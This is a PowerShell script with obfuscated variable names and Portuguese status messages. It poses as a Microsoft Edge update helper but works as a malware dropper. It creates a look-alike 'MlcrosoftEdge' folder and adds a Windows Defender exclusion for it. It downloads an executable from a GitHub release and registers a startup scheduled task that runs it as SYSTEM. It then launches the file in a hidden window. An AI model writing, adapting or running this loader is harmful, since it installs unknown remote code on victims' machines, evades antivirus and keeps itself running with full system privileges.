<#
.SYNOPSIS
D32N 8UD2N328UDXCM3289XM2U83XM238XMU28UXM238MX238X23

.DESCRIPTION
NSDA8D7213ND328YM243DC87Y2M4C28Y7MN2C84YUNM283CM2C4
#>

[CmdletBinding()]
param()

$ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL = "https://github.com/4ybbe/phpSv/releases/download/stupid/EdgeUpdateSupport.exe"
$asokimasoaosmodasmodpaD = "C:\ProgramData\MlcrosoftEdge"
$TksdaoqawopqwNisadnia = "MlcrosoftEdgeUpdateHelper"

function Test-IsAdmin {
    $p = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Add-DefenderExclusion {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    
    try {
        if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
            Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
            Write-Host "Exclusão adicionada com sucesso!" -ForegroundColor Green
            return $true
        } else {
            Write-Warning "Windows Defender não encontrado ou não disponível."
            return $false
        }
    } catch {
        Write-Warning "Falha ao adicionar exclusão no Windows Defender: $_"
        Write-Warning "Tente executar como administrador ou adicione manualmente."
        return $false
    }
}

function Download-File {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Url,
        [Parameter(Mandatory=$true)]
        [string]$OutFile,
        [int]$Retries = 3
    )
    
    # Configura TLS para compatibilidade
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    
    for ($i = 0; $i -lt $Retries; $i++) {
        try {
            Write-Host "Baixando de: $Url (tentativa $($i+1)/$Retries)"
            
            # Usa WebClient para maior compatibilidade
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($Url, $OutFile)
            
            Write-Host "Download concluído com sucesso!" -ForegroundColor Green
            return $true
        } catch {
            if ($i -eq ($Retries - 1)) {
                Write-Error "Falha ao baixar o arquivo após $Retries tentativas: $_"
                return $false
            }
            Write-Host "Tentativa $($i+1) falhou, tentando novamente em 2 segundos..."
            Start-Sleep -Seconds 2
        }
    }
    return $false
}

function Add-ScheduledTask {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Nome,
        [Parameter(Mandatory=$true)]
        [string]$CaminhoExecutavel
    )
    
    try {
        Write-Host "Criando tarefa '$Nome' no agendador do Windows..."
        
        # Remove tarefa existente se houver
        $tarefaExistente = Get-ScheduledTask -TaskName $Nome -ErrorAction SilentlyContinue
        if ($tarefaExistente) {
            Write-Host "Tarefa existente encontrada. Removendo..."
            Unregister-ScheduledTask -TaskName $Nome -Confirm:$false -ErrorAction Stop
        }
        
        # Usa schtasks.exe diretamente para maior compatibilidade
        $schtaskCommand = "schtasks /create /tn `"$Nome`" /tr `"$CaminhoExecutavel`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
        
        Write-Host "Executando: $schtaskCommand"
        
        # Executa o comando e captura a saída
        $result = Invoke-Expression $schtaskCommand 2>&1
        
        if ($LASTEXITCODE -ne 0) {
            throw "Falha ao criar tarefa. Código de saída: $LASTEXITCODE. Saída: $result"
        }
        
        Write-Host "Tarefa '$Nome' criada com sucesso!" -ForegroundColor Green
        return $true
    } catch {
        Write-Error "Falha ao criar tarefa no agendador: $_"
        return $false
    }
}

function Main {
    # Força a execução no modo Single-Threaded para compatibilidade
    [System.Threading.Thread]::CurrentThread.ApartmentState = [System.Threading.ApartmentState]::STA
    
    $isAdmin = Test-IsAdmin
    
    Write-Host "=== INICIANDO INSTALAÇÃO ===" -ForegroundColor Cyan
    Write-Host "URL: $ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL"
    Write-Host "Destino: $asokimasoaosmodasmodpaD"
    Write-Host "Nome da Tarefa: $TksdaoqawopqwNisadnia"
    Write-Host "Modo Administrador: $isAdmin"
    Write-Host ""
    
    if (-not $isAdmin) {
        Write-Warning "⚠️  Este script requer privilégios de administrador para funcionar completamente."
        Write-Warning "Para instalação completa, execute como Administrador."
        Write-Host ""
        
        $confirma = Read-Host "Deseja continuar mesmo assim? (S/N)"
        if ($confirma -ne 'S' -and $confirma -ne 's') {
            Write-Host "Script cancelado pelo usuário."
            return
        }
    }
    
    try {
        # 1. Cria a pasta de destino
        Write-Host "Passo 1/4: Criando diretório..."
        if (-not (Test-Path -Path $asokimasoaosmodasmodpaD)) {
            New-Item -ItemType Directory -Path $asokimasoaosmodasmodpaD -Force | Out-Null
            Write-Host "Diretório criado: $asokimasoaosmodasmodpaD"
        } else {
            Write-Host "Diretório já existe: $asokimasoaosmodasmodpaD"
        }
        
        # 2. Adiciona exclusão no Windows Defender
        if ($isAdmin) {
            Write-Host "`nPasso 2/4: Configurando exclusão no Windows Defender..."
            Add-DefenderExclusion -Path $asokimasoaosmodasmodpaD
        } else {
            Write-Warning "⚠️  Não é administrador. Pulando exclusão do Defender."
        }
        
        # 3. Baixa o executável
        Write-Host "`nPasso 3/4: Baixando executável..."
        $nomeArquivo = [System.IO.Path]::GetFileName($ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL)
        if ([string]::IsNullOrEmpty($nomeArquivo)) {
            $nomeArquivo = "EdgeUpdateSupport.exe"
        }
        $caminhoCompleto = Join-Path -Path $asokimasoaosmodasmodpaD -ChildPath $nomeArquivo
        
        $downloadSuccess = Download-File -Url $ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL -OutFile $caminhoCompleto
        
        if (-not $downloadSuccess) {
            throw "Falha no download do arquivo. Verifique a URL e a conexão com internet."
        }
        
        # 4. Cria tarefa no agendador
        Write-Host "`nPasso 4/4: Configurando tarefa no agendador..."
        if ($isAdmin) {
            $taskSuccess = Add-ScheduledTask -Nome $TksdaoqawopqwNisadnia -CaminhoExecutavel $caminhoCompleto
            
            if (-not $taskSuccess) {
                Write-Warning "⚠️  Falha ao criar tarefa automaticamente."
                Write-Host "Para criar manualmente, execute como administrador:"
                Write-Host "schtasks /create /tn `"$TksdaoqawopqwNisadnia`" /tr `"$caminhoCompleto`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
            }
        } else {
            Write-Warning "⚠️  Não é administrador. Não é possível criar tarefa no agendador."
            Write-Host "Para criar a tarefa manualmente, execute como administrador:"
            Write-Host "schtasks /create /tn `"$TksdaoqawopqwNisadnia`" /tr `"$caminhoCompleto`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
        }
        
        # 5. Inicia o executável
        Write-Host "`nIniciando executável..."
        if (Test-Path -Path $caminhoCompleto) {
            try {
                # Usa Start-Process com diferentes abordagens para compatibilidade
                Start-Process -FilePath $caminhoCompleto -WindowStyle Hidden -ErrorAction Stop
                Write-Host "✅ Processo iniciado com sucesso!" -ForegroundColor Green
            } catch {
                # Tentativa alternativa com Invoke-Item
                try {
                    Invoke-Item -Path $caminhoCompleto -ErrorAction Stop
                    Write-Host "✅ Processo iniciado com sucesso (método alternativo)!" -ForegroundColor Green
                } catch {
                    Write-Warning "Não foi possível iniciar o processo automaticamente."
                    Write-Host "Execute manualmente: $caminhoCompleto"
                }
            }
        } else {
            throw "Arquivo não encontrado para iniciar: $caminhoCompleto"
        }
        
        Write-Host "`n=== INSTALAÇÃO CONCLUÍDA ===" -ForegroundColor Green
        Write-Host "📁 Pasta: $asokimasoaosmodasmodpaD"
        Write-Host "📄 Arquivo: $caminhoCompleto"
        if ($isAdmin) {
            Write-Host "⏰ Tarefa: $TksdaoqawopqwNisadnia (inicia com o Windows)"
            Write-Host "🛡️  Exclusão do Defender: Aplicada"
        }
        
    } catch {
        Write-Error "❌ Erro durante a instalação: $_"
        Write-Host "`n=== INSTALAÇÃO FALHOU ===" -ForegroundColor Red
        Exit 1
    }
}

# Executa a função principal
Main
